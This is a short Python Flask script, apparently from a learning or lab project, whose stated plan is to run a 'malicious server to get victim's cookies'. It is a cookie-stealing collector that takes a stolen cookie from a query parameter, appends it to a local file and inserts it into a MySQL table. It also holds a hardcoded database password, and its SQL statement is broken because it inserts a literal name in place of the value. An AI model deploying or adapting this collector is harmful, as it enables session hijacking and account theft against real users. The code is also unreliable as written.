#PLAN: 
#    Learn + use Flask
#    Find out how to run a 2nd server simultaneously
#    Use malicious server to get victim's cookies

from flask import Flask, request, redirect
import mysql.connector
#from datetime import datetime

app = Flask(__name__)

@app.route('/') #home URL
def cookieburglar():
    
    #get cookie & store in a txt file
    cookieburglar = request.args.get('c')
    f = open("/home/tic/Documents/cookies.txt","a")
    f.write(cookieburglar+ ' ' + '\n')
    #f.write(cookieburglar+ ' ' + str(datetime.now()) + '\n')
    f.close()
    
    conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
    cursor = conn.cursor()
    insert_cookie = ("insert into cookies (cookie) value (cookieburglar);")
    cursor.execute(insert_cookie)
    conn.commit()


if __name__ == "__main__":
    app.run(host = '0.0.0.0', port=5000)
